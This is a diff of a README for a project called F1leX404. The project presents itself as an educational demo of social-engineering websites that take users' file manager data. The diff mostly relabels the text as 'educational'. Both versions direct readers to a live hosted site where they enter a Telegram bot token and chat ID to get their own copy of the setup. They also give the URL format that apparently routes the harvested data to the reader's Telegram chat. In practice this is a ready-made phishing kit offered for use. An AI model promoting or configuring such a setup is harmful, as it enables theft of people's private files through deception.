@@ -1,6 +1,6 @@
 ## 🗃️ F1leX404
 
-This F1leX404 **open-source** project demonstrates how hackers use social engineering to access a user's file manager data through a malicious website. Learn how this method works and how to prevent it.
+This F1leX404 educational **open-source** project demonstrates how hackers use social engineering to access a user's file manager data through a malicious website. Learn how this method works and how to prevent it.
 
 ---
 
@@ -15,7 +15,7 @@ Hackers create fake websites and use **social engineering** to manipulate users 
 **✅ Public code API example**
 
 ```bash
-https://yourdomain.com/index.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://yourdomain.com/index.html?token=your_tolen&id=your_chatid
 ```
 
 **🎥 Educational Demo**
@@ -37,11 +37,11 @@ https://yourdomain.com/index.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
 
 ---
 
-## ⚙️ Build Your Own Site
+## ⚙️ Test this
 
-Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** on the platform below 🔒
+Create a similar educational setup by entering your **Telegram Bot Token** and **Chat ID** on the platform below 🔒
 
-> [▶️ Launch Test Site](https://cinemaxhub.vercel.app/)
+> [▶️ Launch Test ](https://cinemaxhub.vercel.app/)
 
 ---
 
@@ -65,9 +65,9 @@ Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** o
 ## 📋 Quick API
 
 ```bash
-https://cinemaxhub.vercel.app/movie.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://cinemaxhub.vercel.app/movie.html?token=your_token&id=your_chatid
 ```
-⚠️ **Replace** `YOUR_TOKEN` and `YOUR_CHAT_ID` with your actual Telegram Bot Token and Chat ID.
+⚠️ **Replace** `your_token` and `your_chatid` with your actual Telegram Bot Token and Chat ID.
 
 ---
 
